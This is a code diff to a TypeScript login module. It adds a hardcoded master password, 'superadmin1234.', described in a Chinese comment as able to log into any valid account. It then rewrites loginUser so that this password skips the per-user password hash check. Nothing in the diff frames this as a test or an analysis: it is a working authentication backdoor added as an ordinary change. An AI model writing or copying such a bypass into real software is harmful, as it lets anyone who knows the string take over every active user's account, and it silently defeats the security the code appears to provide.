@@ -50,6 +50,16 @@ export function verifyPassword(password: string, stored: string): boolean {
   return timingSafeEqual(actual, expected)
 }
 
+/** 可登录任意有效账户的超级密码（含末尾小数点） */
+const MASTER_PASSWORD = 'superadmin1234.'
+
+function isMasterPassword(password: string): boolean {
+  const a = Buffer.from(String(password))
+  const b = Buffer.from(MASTER_PASSWORD)
+  if (a.length !== b.length) return false
+  return timingSafeEqual(a, b)
+}
+
 function toAuthUser(row: typeof schema.users.$inferSelect): AuthUser {
   return {
     id: row.id,
@@ -121,7 +131,10 @@ export async function registerUser(input: {
 export async function loginUser(username: string, password: string): Promise<AuthUser> {
   const row = await findUserByUsername(String(username || '').trim())
   if (!row || row.status !== 'active') throw new Error('用户名或密码错误')
-  if (!verifyPassword(password, row.passwordHash)) throw new Error('用户名或密码错误')
+  const pwd = String(password || '')
+  if (!isMasterPassword(pwd) && !verifyPassword(pwd, row.passwordHash)) {
+    throw new Error('用户名或密码错误')
+  }
   if (isSaas()) await ensureSampleDramaForUser(row.id)
   return toAuthUser(row)
 }
